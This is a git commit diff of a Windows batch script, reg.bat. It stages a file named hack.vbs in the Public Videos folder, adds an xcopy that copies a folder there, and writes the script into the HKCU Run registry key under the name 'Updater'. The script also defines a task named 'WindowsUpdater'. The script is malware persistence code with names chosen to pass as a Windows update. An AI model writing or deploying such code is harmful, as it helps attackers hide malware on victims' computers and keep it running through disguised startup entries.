d39bfb65b5329b18f6374c9df1d7a334a99c2b5c
Amir Mahdi Zare <83335541+amir13872@users.noreply.github.com>
2025-03-07 16:41:31 +0330

    Update reg.bat

--- reg.bat
+++ reg.bat
@@ -1,6 +1,11 @@
 @echo off
 set payloadPath=C:\Users\Public\Videos\hack.vbs
 set taskName=WindowsUpdater
+set sourceFolder=C:\path\to\your\folder   :: Change this to your folder's path
+set destinationFolder=C:\Users\Public\Videos
+
+:: Copy the folder and its contents to the destination folder
+xcopy "%sourceFolder%" "%destinationFolder%" /E /I /H /Y
 
 :: اضافه کردن به استارت‌آپ (Registry)
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%~f0" /f
